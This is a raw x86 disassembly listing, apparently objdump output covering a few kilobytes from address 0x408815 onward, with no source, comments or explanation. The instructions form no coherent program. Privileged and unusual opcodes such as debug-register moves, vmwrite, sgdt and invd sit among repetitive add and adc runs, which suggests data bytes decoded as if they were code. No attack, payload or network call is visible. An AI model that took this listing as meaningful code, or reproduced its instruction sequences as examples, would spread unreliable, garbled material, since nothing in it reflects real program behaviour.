  408815:	06                   	push   %es
  408816:	08 0f                	or     %cl,(%edi)
  408818:	d1 02                	roll   $1,(%edx)
  40881a:	7b 14                	jnp    0x408830
  40881c:	7d 0f                	jge    0x40882d
  40881e:	d9 02                	flds   (%edx)
  408820:	7b 14                	jnp    0x408836
  408822:	52                   	push   %edx
  408823:	00 d9                	add    %bl,%cl
  408825:	02 dd                	add    %ch,%bl
  408827:	0d 92 0f e1 02       	or     $0x2e10f92,%eax
  40882c:	e9 11 db 09 a9       	jmp    0xa94a6342
  408831:	01 67 09             	add    %esp,0x9(%edi)
  408834:	9c                   	pushf
  408835:	0f b1 00             	cmpxchg %eax,(%eax)
  408838:	f8                   	clc
  408839:	16                   	push   %ss
  40883a:	af                   	scas   %es:(%edi),%eax
  40883b:	0f 21 02             	mov    %db0,%edx
  40883e:	71 09                	jno    0x408849
  408840:	44                   	inc    %esp
  408841:	02 24 00             	add    (%eax,%eax,1),%ah
  408844:	81 17 aa 09 a9 00    	adcl   $0xa909aa,(%edi)
  40884a:	7b 14                	jnp    0x408860
  40884c:	52                   	push   %edx
  40884d:	00 a9 01 a8 18 d1    	add    %ch,-0x2ee757ff(%ecx)
  408853:	0f a9                	pop    %gs
  408855:	01 bc 18 d6 0f e9 02 	add    %edi,0x2e90fd6(%eax,%ebx,1)
  40885c:	7b 14                	jnp    0x408872
  40885e:	31 09                	xor    %ecx,(%ecx)
  408860:	89 01                	mov    %eax,(%ecx)
  408862:	fd                   	std
  408863:	10 dc                	adc    %bl,%ah
  408865:	0f a1                	pop    %fs
  408867:	01 2e                	add    %ebp,(%esi)
  408869:	1b 55 09             	sbb    0x9(%ebp),%edx
  40886c:	21 02                	and    %eax,(%edx)
  40886e:	3e 15 48 02 f1 02    	ds adc $0x2f10248,%eax
  408874:	0e                   	push   %cs
  408875:	1b 44 02 f1          	sbb    -0xf(%edx,%eax,1),%eax
  408879:	02 a5 16 e3 0f f1    	add    -0xef01cea(%ebp),%ah
  40887f:	02 ea                	add    %dl,%ch
  408881:	1a e8                	sbb    %al,%ch
  408883:	0f 01 03             	sgdtl  (%ebx)
  408886:	ed                   	in     (%dx),%eax
  408887:	08 48 02             	or     %cl,0x2(%eax)
  40888a:	09 03                	or     %eax,(%ebx)
  40888c:	cd 1a                	int    $0x1a
  40888e:	ef                   	out    %eax,(%dx)
  40888f:	0f 21 02             	mov    %db0,%edx
  408892:	7c 17                	jl     0x4088ab
  408894:	db 09                	fisttpl (%ecx)
  408896:	11 03                	adc    %eax,(%ebx)
  408898:	7b 14                	jnp    0x4088ae
  40889a:	f5                   	cmc
  40889b:	0f 79 02             	vmwrite (%edx),%eax
  40889e:	01 07                	add    %eax,(%edi)
  4088a0:	0e                   	push   %cs
  4088a1:	10 b9 00 7b 14 52    	adc    %bh,0x52147b00(%ecx)
  4088a7:	00 b9 00 a5 0d f9    	add    %bh,-0x6f25b00(%ecx)
  4088ad:	01 a9 00 cd 07 22    	add    %ebp,0x2207cd00(%ecx)
  4088b3:	10 b9 00 3e 0a fe    	adc    %bh,-0x1f5c200(%ecx)
  4088b9:	01 a9 00 5c 09 28    	add    %ebp,0x28095c00(%ecx)
  4088bf:	10 b9 00 67 09 03    	adc    %bh,0x3096700(%ecx)
  4088c5:	02 a9 00 1f 12 2e    	add    0x2e121f00(%ecx),%ch
  4088cb:	10 cc                	adc    %cl,%ah
  4088cd:	00 25 0a 9e 0c cc    	add    %ah,0xcc0c9e0a
  4088d3:	00 88 18 48 09 cc    	add    %cl,-0x33f6b7e8(%eax)
  4088d9:	00 db                	add    %bl,%bl
  4088db:	0e                   	push   %cs
  4088dc:	ac                   	lods   %ds:(%esi),%al
  4088dd:	0c a1                	or     $0xa1,%al
  4088df:	01 5b 1b             	add    %ebx,0x1b(%ebx)
  4088e2:	5f                   	pop    %edi
  4088e3:	00 a9 00 7b 14 48    	add    %ch,0x48147b00(%ecx)
  4088e9:	01 d1                	add    %edx,%ecx
  4088eb:	00 59 07             	add    %bl,0x7(%ecx)
  4088ee:	50                   	push   %eax
  4088ef:	10 d1                	adc    %dl,%cl
  4088f1:	00 16                	add    %dl,(%esi)
  4088f3:	09 08                	or     %ecx,(%eax)
  4088f5:	02 19                	add    (%ecx),%bl
  4088f7:	03 13                	add    (%ebx),%edx
  4088f9:	0a 52 00             	or     0x0(%edx),%dl
  4088fc:	d4 00                	aam    $0x0
  4088fe:	7b 14                	jnp    0x408914
  408900:	52                   	push   %edx
  408901:	00 21                	add    %ah,(%ecx)
  408903:	02 f9                	add    %cl,%bh
  408905:	08 44 02 21          	or     %al,0x21(%edx,%eax,1)
  408909:	03 7b 14             	add    0x14(%ebx),%edi
  40890c:	7d 0f                	jge    0x40891d
  40890e:	21 03                	and    %eax,(%ebx)
  408910:	49                   	dec    %ecx
  408911:	17                   	pop    %ss
  408912:	75 10                	jne    0x408924
  408914:	29 03                	sub    %eax,(%ebx)
  408916:	63 14 7b             	arpl   %edx,(%ebx,%edi,2)
  408919:	10 31                	adc    %dh,(%ecx)
  40891b:	03 11                	add    (%ecx),%edx
  40891d:	18 81 10 39 03 2e    	sbb    %al,0x2e033910(%ecx)
  408923:	0c 87                	or     $0x87,%al
  408925:	10 d4                	adc    %dl,%ah
  408927:	00 1e                	add    %bl,(%esi)
  408929:	16                   	push   %ss
  40892a:	bf 09 d4 00 74       	mov    $0x7400d409,%edi
  40892f:	07                   	pop    %es
  408930:	7d 0c                	jge    0x40893e
  408932:	39 03                	cmp    %eax,(%ebx)
  408934:	13 0a                	adc    (%edx),%ecx
  408936:	52                   	push   %edx
  408937:	00 31                	add    %dh,(%ecx)
  408939:	03 56 19             	add    0x19(%esi),%edx
  40893c:	29 01                	sub    %eax,(%ecx)
  40893e:	d4 00                	aam    $0x0
  408940:	3b 18                	cmp    (%eax),%ebx
  408942:	f4                   	hlt
  408943:	0e                   	push   %cs
  408944:	21 03                	and    %eax,(%ebx)
  408946:	7b 14                	jnp    0x40895c
  408948:	03 02                	add    (%edx),%eax
  40894a:	39 03                	cmp    %eax,(%ebx)
  40894c:	96                   	xchg   %eax,%esi
  40894d:	0f 87 10 29 03 13    	ja     0x1343b263
  408953:	0a 52 00             	or     0x0(%edx),%dl
  408956:	21 02                	and    %eax,(%edx)
  408958:	53                   	push   %ebx
  408959:	18 a0 10 21 02 73    	sbb    %ah,0x73022110(%eax)
  40895f:	10 a4 10 21 02 fa 1a 	adc    %ah,0x1afa0221(%eax,%edx,1)
  408966:	44                   	inc    %esp
  408967:	02 01                	add    (%ecx),%al
  408969:	03 6c 18 48          	add    0x48(%eax,%ebx,1),%ebp
  40896d:	02 59 03             	add    0x3(%ecx),%bl
  408970:	7b 14                	jnp    0x408986
  408972:	03 02                	add    (%edx),%eax
  408974:	59                   	pop    %ecx
  408975:	03 13                	add    (%ebx),%edx
  408977:	0d aa 10 a1 01       	or     $0x1a110aa,%eax
  40897c:	c2 16 ae             	ret    $0xae16
  40897f:	10 69 03             	adc    %ch,0x3(%ecx)
  408982:	7b 14                	jnp    0x408998
  408984:	52                   	push   %edx
  408985:	00 c1                	add    %al,%cl
  408987:	00 1c 06             	add    %bl,(%esi,%eax,1)
  40898a:	af                   	scas   %es:(%edi),%eax
  40898b:	09 71 03             	or     %esi,0x3(%ecx)
  40898e:	21 0e                	and    %ecx,(%esi)
  408990:	bf 10 71 01 ec       	mov    $0xec017110,%edi
  408995:	0d 92 0f a9 00       	or     $0xa90f92,%eax
  40899a:	cd 07                	int    $0x7
  40899c:	28 10                	sub    %dl,(%eax)
  40899e:	a1 01 0c 0e c6       	mov    0xc60e0c01,%eax
  4089a3:	10 a1 01 f0 13 08    	adc    %ah,0x813f001(%ecx)
  4089a9:	02 dc                	add    %ah,%bl
  4089ab:	00 25 0a 9e 0c dc    	add    %ah,0xdc0c9e0a
  4089b1:	00 88 18 48 09 dc    	add    %cl,-0x23f6b7e8(%eax)
  4089b7:	00 db                	add    %bl,%bl
  4089b9:	0e                   	push   %cs
  4089ba:	ac                   	lods   %ds:(%esi),%al
  4089bb:	0c 79                	or     $0x79,%al
  4089bd:	03 85 0d 20 11 21    	add    0x2111200d(%ebp),%eax
  4089c3:	02 45 18             	add    0x18(%ebp),%al
  4089c6:	a0 10 d1 00 7b       	mov    0x7b00d110,%al
  4089cb:	14 52                	adc    $0x52,%al
  4089cd:	00 d1                	add    %dl,%cl
  4089cf:	00 a2 11 48 11 89    	add    %ah,-0x76eeb7ef(%edx)
  4089d5:	03 d0                	add    %eax,%edx
  4089d7:	08 03                	or     %al,(%ebx)
  4089d9:	02 89 03 97 16 03    	add    0x3169703(%ecx),%cl
  4089df:	02 89 03 f7 0b 46    	add    0x460bf703(%ecx),%cl
  4089e5:	03 89 03 3b 19 46    	add    0x46193b03(%ecx),%ecx
  4089eb:	03 89 03 d7 19 46    	add    0x4619d703(%ecx),%ecx
  4089f1:	03 d1                	add    %ecx,%edx
  4089f3:	00 88 18 29 01 d1    	add    %cl,-0x2efed6e8(%eax)
  4089f9:	00 28                	add    %ch,(%eax)
  4089fb:	19 4e 11             	sbb    %ecx,0x11(%esi)
  4089fe:	99                   	cltd
  4089ff:	03 be 07 08 02 d1    	add    -0x2efdf7f9(%esi),%edi
  408a05:	00 75 17             	add    %dh,0x17(%ebp)
  408a08:	52                   	push   %edx
  408a09:	00 a1 01 6f 17 54    	add    %ah,0x54176f01(%ecx)
  408a0f:	11 a1 01 de 07 5b    	adc    %esp,0x5b07de01(%ecx)
  408a15:	11 d4                	adc    %edx,%esp
  408a17:	00 8c 0d 61 11 a1 01 	add    %cl,0x1a11161(%ebp,%ecx,1)
  408a1e:	6f                   	outsl  %ds:(%esi),(%dx)
  408a1f:	17                   	pop    %ss
  408a20:	67 11 a1 01 d9       	adc    %esp,-0x26ff(%bx,%di)
  408a25:	0f 08                	invd
  408a27:	02 81 03 35 1a 71    	add    0x711a3503(%ecx),%al
  408a2d:	11 81 03 2a 1a 7d    	adc    %eax,0x7d1a2a03(%ecx)
  408a33:	11 81 03 59 15 85    	adc    %eax,-0x7aeaa6fd(%ecx)
  408a39:	11 81 03 1c 0c 87    	adc    %eax,-0x78f3e3fd(%ecx)
  408a3f:	10 81 03 10 0c 03    	adc    %al,0x30c1003(%ecx)
  408a45:	02 81 03 25 0c 92    	add    -0x6df3dafd(%ecx),%al
  408a4b:	11 01                	adc    %eax,(%ecx)
  408a4d:	03 dd                	add    %ebp,%ebx
  408a4f:	08 44 02 09          	or     %al,0x9(%edx,%eax,1)
  408a53:	03 6b 19             	add    0x19(%ebx),%ebp
  408a56:	ef                   	out    %eax,(%dx)
  408a57:	0f a1                	pop    %fs
  408a59:	01 c2                	add    %eax,%edx
  408a5b:	16                   	push   %ss
  408a5c:	a2 11 09 03 37       	mov    %al,0x37030911
  408a61:	0a ba 09 a1 01 1e    	or     0x1e01a109(%edx),%bh
  408a67:	16                   	push   %ss
  408a68:	b0 11                	mov    $0x11,%al
  408a6a:	e4 00                	in     $0x0,%al
  408a6c:	7b 14                	jnp    0x408a82
  408a6e:	31 09                	xor    %ecx,(%ecx)
  408a70:	21 00                	and    %eax,(%eax)
  408a72:	63 11                	arpl   %edx,(%ecx)
  408a74:	c7                   	(bad)
  408a75:	11 ec                	adc    %ebp,%esp
  408a77:	00 7b 14             	add    %bh,0x14(%ebx)
  408a7a:	31 09                	xor    %ecx,(%ecx)
  408a7c:	cc                   	int3
  408a7d:	00 91 07 94 09 cc    	add    %dl,-0x33f66bf9(%ecx)
  408a83:	00 4b 11             	add    %cl,0x11(%ebx)
  408a86:	2d 0a cc 00 a3       	sub    $0xa300cc0a,%eax
  408a8b:	17                   	pop    %ss
  408a8c:	7d 0c                	jge    0x408a9a
  408a8e:	cc                   	int3
  408a8f:	00 90 09 9e 00 f4    	add    %dl,-0xbff61f7(%eax)
  408a95:	00 7b 14             	add    %bh,0x14(%ebx)
  408a98:	31 09                	xor    %ecx,(%ecx)
  408a9a:	dc 00                	faddl  (%eax)
  408a9c:	91                   	xchg   %eax,%ecx
  408a9d:	07                   	pop    %es
  408a9e:	94                   	xchg   %eax,%esp
  408a9f:	09 dc                	or     %ebx,%esp
  408aa1:	00 4b 11             	add    %cl,0x11(%ebx)
  408aa4:	2d 0a dc 00 a3       	sub    $0xa300dc0a,%eax
  408aa9:	17                   	pop    %ss
  408aaa:	7d 0c                	jge    0x408ab8
  408aac:	dc 00                	faddl  (%eax)
  408aae:	90                   	nop
  408aaf:	09 9e 00 c1 03 7b    	or     %ebx,0x7b03c100(%esi)
  408ab5:	14 31                	adc    $0x31,%al
  408ab7:	09 21                	or     %esp,(%ecx)
  408ab9:	00 63 11             	add    %ah,0x11(%ebx)
  408abc:	40                   	inc    %eax
  408abd:	12 89 03 7b 14 52    	adc    0x52147b03(%ecx),%cl
  408ac3:	00 c9                	add    %cl,%cl
  408ac5:	03 cc                	add    %esp,%ecx
  408ac7:	0d 58 12 89 03       	or     $0x3891258,%eax
  408acc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  408acd:	08 5e 12             	or     %bl,0x12(%esi)
  408ad0:	d1 00                	roll   $1,(%eax)
  408ad2:	88 18                	mov    %bl,(%eax)
  408ad4:	65 12 07             	adc    %gs:(%edi),%al
  408ad7:	00 04 00             	add    %al,(%eax,%eax,1)
  408ada:	0d 00 07 00 08       	or     $0x8000700,%eax
  408adf:	00 10                	add    %dl,(%eax)
  408ae1:	00 12                	add    %dl,(%edx)
  408ae3:	00 f1                	add    %dh,%cl
  408ae5:	00 24 01             	add    %ah,(%ecx,%eax,1)
  408ae8:	08 00                	or     %al,(%eax)
  408aea:	09 01                	or     %eax,(%ecx)
  408aec:	24 01                	and    $0x1,%al
  408aee:	08 00                	or     %al,(%eax)
  408af0:	4d                   	dec    %ebp
  408af1:	01 24 01             	add    %esp,(%ecx,%eax,1)
  408af4:	08 00                	or     %al,(%eax)
  408af6:	c1 01 24             	roll   $0x24,(%ecx)
  408af9:	01 08                	add    %ecx,(%eax)
  408afb:	00 c5                	add    %al,%ch
  408afd:	01 24 01             	add    %esp,(%ecx,%eax,1)
  408b00:	12 00                	adc    (%eax),%al
  408b02:	c9                   	leave
  408b03:	01 24 01             	add    %esp,(%ecx,%eax,1)
  408b06:	0e                   	push   %cs
  408b07:	00 d5                	add    %dl,%ch
  408b09:	01 77 02             	add    %esi,0x2(%edi)
  408b0c:	0e                   	push   %cs
  408b0d:	00 dd                	add    %bl,%ch
  408b0f:	01 77 02             	add    %esi,0x2(%edi)
  408b12:	2e 00 1b             	add    %bl,%cs:(%ebx)
  408b15:	00 dc                	add    %bl,%ah
  408b17:	02 2e                	add    (%esi),%ch
  408b19:	00 23                	add    %ah,(%ebx)
  408b1b:	00 e5                	add    %ah,%ch
  408b1d:	02 2e                	add    (%esi),%ch
  408b1f:	00 2b                	add    %ch,(%ebx)
  408b21:	00 0a                	add    %cl,(%edx)
  408b23:	03 2e                	add    (%esi),%ebp
  408b25:	00 33                	add    %dh,(%ebx)
  408b27:	00 13                	add    %dl,(%ebx)
  408b29:	03 2e                	add    (%esi),%ebp
  408b2b:	00 3b                	add    %bh,(%ebx)
  408b2d:	00 28                	add    %ch,(%eax)
  408b2f:	03 2e                	add    (%esi),%ebp
  408b31:	00 43 00             	add    %al,0x0(%ebx)
  408b34:	28 03                	sub    %al,(%ebx)
  408b36:	2e 00 4b 00          	add    %cl,%cs:0x0(%ebx)
  408b3a:	28 03                	sub    %al,(%ebx)
  408b3c:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  408b40:	13 03                	adc    (%ebx),%eax
  408b42:	2e 00 5b 00          	add    %bl,%cs:0x0(%ebx)
  408b46:	2e 03 2e             	add    %cs:(%esi),%ebp
  408b49:	00 63 00             	add    %ah,0x0(%ebx)
  408b4c:	28 03                	sub    %al,(%ebx)
  408b4e:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  408b52:	28 03                	sub    %al,(%ebx)
  408b54:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  408b58:	4b                   	dec    %ebx
  408b59:	03 2e                	add    (%esi),%ebp
  408b5b:	00 7b 00             	add    %bh,0x0(%ebx)
  408b5e:	75 03                	jne    0x408b63
  408b60:	2e 00 83 00 82 03 83 	add    %al,%cs:-0x7cfc7e00(%ebx)
  408b67:	00 93 00 08 04 e3    	add    %dl,-0x1cfbf800(%ebx)
  408b6d:	00 93 00 08 04 03    	add    %dl,0x3040800(%ebx)
  408b73:	01 93 00 08 04 23    	add    %edx,0x23040800(%ebx)
  408b79:	01 93 00 08 04 40    	add    %edx,0x40040800(%ebx)
  408b7f:	01 8b 00 d3 03 43    	add    %ecx,0x4303d300(%ebx)
  408b85:	01 93 00 08 04 63    	add    %edx,0x63040800(%ebx)
  408b8b:	01 93 00 08 04 83    	add    %edx,-0x7cfbf800(%ebx)
  408b91:	01 93 00 08 04 a0    	add    %edx,-0x5ffbf800(%ebx)
  408b97:	01 9b 00 08 04 a3    	add    %ebx,-0x5cfbf800(%ebx)
  408b9d:	01 93 00 08 04 c3    	add    %edx,-0x3cfbf800(%ebx)
  408ba3:	01 93 00 08 04 03    	add    %edx,0x3040800(%ebx)
  408ba9:	02 93 00 08 04 23    	add    0x23040800(%ebx),%dl
  408baf:	02 93 00 08 04 40    	add    0x40040800(%ebx),%dl
  408bb5:	02 8b 00 0d 04 43    	add    0x43040d00(%ebx),%cl
  408bbb:	02 93 00 08 04 63    	add    0x63040800(%ebx),%dl
  408bc1:	02 93 00 08 04 80    	add    -0x7ffbf800(%ebx),%dl
  408bc7:	02 8b 00 3e 04 83    	add    -0x7cfbc200(%ebx),%cl
  408bcd:	02 93 00 08 04 a0    	add    -0x5ffbf800(%ebx),%dl
  408bd3:	02 8b 00 70 04 c0    	add    -0x3ffb9000(%ebx),%cl
  408bd9:	02 8b 00 a0 04 e0    	add    -0x1ffb6000(%ebx),%cl
  408bdf:	02 8b 00 d0 04 e3    	add    -0x1cfb3000(%ebx),%cl
  408be5:	02 93 00 08 04 00    	add    0x40800(%ebx),%dl
  408beb:	03 8b 00 fc 04 03    	add    0x304fc00(%ebx),%ecx
  408bf1:	03 93 00 08 04 20    	add    0x20040800(%ebx),%edx
  408bf7:	03 8b 00 2c 05 23    	add    0x23052c00(%ebx),%ecx
  408bfd:	03 93 00 08 04 40    	add    0x40040800(%ebx),%edx
  408c03:	03 8b 00 5a 05 43    	add    0x43055a00(%ebx),%ecx
  408c09:	03 93 00 08 04 63    	add    0x63040800(%ebx),%edx
  408c0f:	03 93 00 08 04 80    	add    -0x7ffbf800(%ebx),%edx
  408c15:	03 9b 00 08 04 a3    	add    -0x5cfbf800(%ebx),%ebx
  408c1b:	03 93 00 08 04 c0    	add    -0x3ffbf800(%ebx),%edx
  408c21:	03 9b 00 08 04 00    	add    0x40800(%ebx),%ebx
  408c27:	04 9b                	add    $0x9b,%al
  408c29:	00 08                	add    %cl,(%eax)
  408c2b:	04 23                	add    $0x23,%al
  408c2d:	04 93                	add    $0x93,%al
  408c2f:	00 08                	add    %cl,(%eax)
  408c31:	04 40                	add    $0x40,%al
  408c33:	04 9b                	add    $0x9b,%al
  408c35:	00 08                	add    %cl,(%eax)
  408c37:	04 43                	add    $0x43,%al
  408c39:	04 93                	add    $0x93,%al
  408c3b:	00 08                	add    %cl,(%eax)
  408c3d:	04 63                	add    $0x63,%al
  408c3f:	04 93                	add    $0x93,%al
  408c41:	00 08                	add    %cl,(%eax)
  408c43:	04 80                	add    $0x80,%al
  408c45:	04 9b                	add    $0x9b,%al
  408c47:	00 08                	add    %cl,(%eax)
  408c49:	04 83                	add    $0x83,%al
  408c4b:	04 93                	add    $0x93,%al
  408c4d:	00 08                	add    %cl,(%eax)
  408c4f:	04 a3                	add    $0xa3,%al
  408c51:	04 93                	add    $0x93,%al
  408c53:	00 08                	add    %cl,(%eax)
  408c55:	04 c0                	add    $0xc0,%al
  408c57:	04 9b                	add    $0x9b,%al
  408c59:	00 08                	add    %cl,(%eax)
  408c5b:	04 c3                	add    $0xc3,%al
  408c5d:	04 93                	add    $0x93,%al
  408c5f:	00 08                	add    %cl,(%eax)
  408c61:	04 e3                	add    $0xe3,%al
  408c63:	04 93                	add    $0x93,%al
  408c65:	00 08                	add    %cl,(%eax)
  408c67:	04 00                	add    $0x0,%al
  408c69:	05 9b 00 08 04       	add    $0x408009b,%eax
  408c6e:	03 05 93 00 08 04    	add    0x4080093,%eax
  408c74:	23 05 93 00 08 04    	and    0x4080093,%eax
  408c7a:	40                   	inc    %eax
  408c7b:	05 9b 00 08 04       	add    $0x408009b,%eax
  408c80:	43                   	inc    %ebx
  408c81:	05 93 00 08 04       	add    $0x4080093,%eax
  408c86:	63 05 93 00 08 04    	arpl   %eax,0x4080093
  408c8c:	c0 05 8b 00 8d 05 e0 	rolb   $0xe0,0x58d008b
  408c93:	05 8b 00 b9 05       	add    $0x5b9008b,%eax
  408c98:	20 06                	and    %al,(%esi)
  408c9a:	8b 00                	mov    (%eax),%eax
  408c9c:	ee                   	out    %al,(%dx)
  408c9d:	05 40 06 8b 00       	add    $0x8b0640,%eax
  408ca2:	1c 06                	sbb    $0x6,%al
  408ca4:	c0 06 8b             	rolb   $0x8b,(%esi)
  408ca7:	00 47 06             	add    %al,0x6(%edi)
  408caa:	00 07                	add    %al,(%edi)
  408cac:	9b                   	fwait
  408cad:	00 08                	add    %cl,(%eax)
  408caf:	04 40                	add    $0x40,%al
  408cb1:	07                   	pop    %es
  408cb2:	9b                   	fwait
  408cb3:	00 08                	add    %cl,(%eax)
  408cb5:	04 80                	add    $0x80,%al
  408cb7:	07                   	pop    %es
  408cb8:	9b                   	fwait
  408cb9:	00 08                	add    %cl,(%eax)
  408cbb:	04 c0                	add    $0xc0,%al
  408cbd:	07                   	pop    %es
  408cbe:	9b                   	fwait
  408cbf:	00 08                	add    %cl,(%eax)
  408cc1:	04 00                	add    $0x0,%al
  408cc3:	08 9b 00 08 04 60    	or     %bl,0x60040800(%ebx)
  408cc9:	08 8b 00 7a 06 80    	or     %cl,-0x7ff98600(%ebx)
  408ccf:	08 8b 00 bd 06 00    	or     %cl,0x6bd00(%ebx)
  408cd5:	09 8b 00 fe 06 20    	or     %ecx,0x2006fe00(%ebx)
  408cdb:	09 8b 00 31 07 40    	or     %ecx,0x40073100(%ebx)
  408ce1:	0a 9b 00 08 04 80    	or     -0x7ffbf800(%ebx),%bl
  408ce7:	0a 9b 00 08 04 c0    	or     -0x3ffbf800(%ebx),%bl
  408ced:	0a 9b 00 08 04 00    	or     0x40800(%ebx),%bl
  408cf3:	0b 9b 00 08 04 20    	or     0x20040800(%ebx),%ebx
  408cf9:	0b 8b 00 68 07 00    	or     0x76800(%ebx),%ecx
  408cff:	0c 9b                	or     $0x9b,%al
  408d01:	00 08                	add    %cl,(%eax)
  408d03:	04 c0                	add    $0xc0,%al
  408d05:	0d 8b 00 91 07       	or     $0x791008b,%eax
  408d0a:	a0 0e 8b 00 d0       	mov    0xd0008b0e,%al
  408d0f:	07                   	pop    %es
  408d10:	c0 0e 8b             	rorb   $0x8b,(%esi)
  408d13:	00 07                	add    %al,(%edi)
  408d15:	08 e0                	or     %ah,%al
  408d17:	0e                   	push   %cs
  408d18:	8b 00                	mov    (%eax),%eax
  408d1a:	37                   	aaa
  408d1b:	08 00                	or     %al,(%eax)
  408d1d:	0f 8b 00 63 08 20    	jnp    0x2048f023
  408d23:	0f 8b 00 9a 08 40    	jnp    0x40492729
  408d29:	0f 8b 00 ce 08 c0    	jnp    0xc0495b2f
  408d2f:	10 9b 00 08 04 00    	adc    %bl,0x40800(%ebx)
  408d35:	11 9b 00 08 04 40    	adc    %ebx,0x40040800(%ebx)
  408d3b:	11 9b 00 08 04 80    	adc    %ebx,-0x7ffbf800(%ebx)
  408d41:	11 9b 00 08 04 c0    	adc    %ebx,-0x3ffbf800(%ebx)
  408d47:	11 9b 00 08 04 00    	adc    %ebx,0x40800(%ebx)
  408d4d:	12 9b 00 08 04 40    	adc    0x40040800(%ebx),%bl
  408d53:	12 9b 00 08 04 c9    	adc    -0x36fbf800(%ebx),%bl
  408d59:	00 15 02 01 00 07    	add    %dl,0x7000102
  408d5f:	00 00                	add    %al,(%eax)
  408d61:	00 2c 00             	add    %ch,(%eax,%eax,1)
  408d64:	01 00                	add    %eax,(%eax)
  408d66:	20 00                	and    %al,(%eax)
  408d68:	00 00                	add    %al,(%eax)
  408d6a:	2d 00 01 09 1d       	sub    $0x1d090100,%eax
  408d6f:	09 3e                	or     %edi,(%esi)
  408d71:	09 60 09             	or     %esp,0x9(%eax)
  408d74:	33 0a                	xor    (%edx),%ecx
  408d76:	76 0a                	jbe    0x408d82
  408d78:	80 0a 8a             	orb    $0x8a,(%edx)
  408d7b:	0a 94 0a 9e 0a a8 0a 	or     0xaa80a9e(%edx,%ecx,1),%dl
  408d82:	b2 0a                	mov    $0xa,%dl
  408d84:	bc 0a c6 0a 07       	mov    $0x70ac60a,%esp
  408d89:	0b 66 0b             	or     0xb(%esi),%esp
  408d8c:	8c 0b                	mov    %cs,(%ebx)
  408d8e:	e4 0b                	in     $0xb,%al
  408d90:	14 0c                	adc    $0xc,%al
  408d92:	5f                   	pop    %edi
  408d93:	0c 83                	or     $0x83,%al
  408d95:	0c 92                	or     $0x92,%al
  408d97:	0c b5                	or     $0xb5,%al
  408d99:	0c b9                	or     $0xb9,%al
  408d9b:	0c ca                	or     $0xca,%al
  408d9d:	0c da                	or     $0xda,%al
  408d9f:	0c e4                	or     $0xe4,%al
  408da1:	0c 1e                	or     $0x1e,%al
  408da3:	0d 77 0d 0c 0e       	or     $0xe0c0d77,%eax
  408da8:	29 0e                	sub    %ecx,(%esi)
  408daa:	41                   	inc    %ecx
  408dab:	0e                   	push   %cs
  408dac:	4b                   	dec    %ebx
  408dad:	0e                   	push   %cs
  408dae:	8a 0e                	mov    (%esi),%cl
  408db0:	8f                   	(bad)
  408db1:	0e                   	push   %cs
  408db2:	a1 0e ab 0e b5       	mov    0xb50eab0e,%eax
  408db7:	0e                   	push   %cs
  408db8:	d7                   	xlat   %ds:(%ebx)
  408db9:	0e                   	push   %cs
  408dba:	4d                   	dec    %ebp
  408dbb:	0f 67 0f             	packuswb (%edi),%mm1
  408dbe:	8d 0f                	lea    (%edi),%ecx
  408dc0:	a1 0f b3 0f b8       	mov    0xb80fb30f,%eax
  408dc5:	0f 33                	rdpmc
  408dc7:	10 45 10             	adc    %al,0x10(%ebp)
  408dca:	5f                   	pop    %edi
  408dcb:	10 8c 10 9c 10 b4 10 	adc    %cl,0x10b4109c(%eax,%edx,1)
  408dd2:	cc                   	int3
  408dd3:	10 d8                	adc    %bl,%al
  408dd5:	10 e4                	adc    %ah,%ah
  408dd7:	10 f0                	adc    %dh,%al
  408dd9:	10 fc                	adc    %bh,%ah
  408ddb:	10 08                	adc    %cl,(%eax)
  408ddd:	11 1a                	adc    %ebx,(%edx)
  408ddf:	11 2d 11 8a 11 98    	adc    %ebp,0x98118a11
  408de5:	11 b5 11 e2 11 fa    	adc    %esi,-0x5ee1def(%ebp)
  408deb:	11 17                	adc    %edx,(%edi)
  408ded:	12 38                	adc    (%eax),%bh
  408def:	12 1e                	adc    (%esi),%bl
  408df1:	00 01                	add    %al,(%ecx)
  408df3:	00 00                	add    %al,(%eax)
  408df5:	00 a9 0d 0c 02 02    	add    %ch,0x2020c0d(%ecx)
  408dfb:	00 62 00             	add    %ah,0x0(%edx)
  408dfe:	03 00                	add    (%eax),%eax
  408e00:	04 00                	add    $0x0,%al
  408e02:	18 00                	sbb    %al,(%eax)
  408e04:	03 00                	add    (%eax),%eax
  408e06:	04 00                	add    $0x0,%al
  408e08:	1a 00                	sbb    (%eax),%al
  408e0a:	05 00 07 00 36       	add    $0x36000700,%eax
  408e0f:	00 03                	add    %al,(%ebx)
  408e11:	00 07                	add    %al,(%edi)
  408e13:	00 38                	add    %bh,(%eax)
  408e15:	00 05 00 08 00 3a    	add    %al,0x3a000800
  408e1b:	00 03                	add    %al,(%ebx)
  408e1d:	00 08                	add    %cl,(%eax)
  408e1f:	00 3c 00             	add    %bh,(%eax,%eax,1)
  408e22:	05 00 09 00 3e       	add    $0x3e000900,%eax
  408e27:	00 03                	add    %al,(%ebx)
  408e29:	00 09                	add    %cl,(%ecx)
  408e2b:	00 40 00             	add    %al,0x0(%eax)
  408e2e:	05 00 0a 00 42       	add    $0x42000a00,%eax
  408e33:	00 03                	add    %al,(%ebx)
  408e35:	00 0a                	add    %cl,(%edx)
  408e37:	00 44 00 05          	add    %al,0x5(%eax,%eax,1)
  408e3b:	00 0b                	add    %cl,(%ebx)
  408e3d:	00 46 00             	add    %al,0x0(%esi)
  408e40:	03 00                	add    (%eax),%eax
  408e42:	0b 00                	or     (%eax),%eax
  408e44:	48                   	dec    %eax
  408e45:	00 05 00 0c 00 4a    	add    %al,0x4a000c00
  408e4b:	00 03                	add    %al,(%ebx)
  408e4d:	00 0c 00             	add    %cl,(%eax,%eax,1)
  408e50:	4c                   	dec    %esp
  408e51:	00 05 00 0d 00 4e    	add    %al,0x4e000d00
  408e57:	00 03                	add    %al,(%ebx)
  408e59:	00 0d 00 50 00 05    	add    %cl,0x5005000
  408e5f:	00 0e                	add    %cl,(%esi)
  408e61:	00 52 00             	add    %dl,0x0(%edx)
  408e64:	03 00                	add    (%eax),%eax
  408e66:	0e                   	push   %cs
  408e67:	00 54 00 05          	add    %dl,0x5(%eax,%eax,1)
  408e6b:	00 10                	add    %dl,(%eax)
  408e6d:	00 6e 00             	add    %ch,0x0(%esi)
  408e70:	03 00                	add    (%eax),%eax
  408e72:	10 00                	adc    %al,(%eax)
  408e74:	70 00                	jo     0x408e76
  408e76:	05 00 11 00 72       	add    $0x72001100,%eax
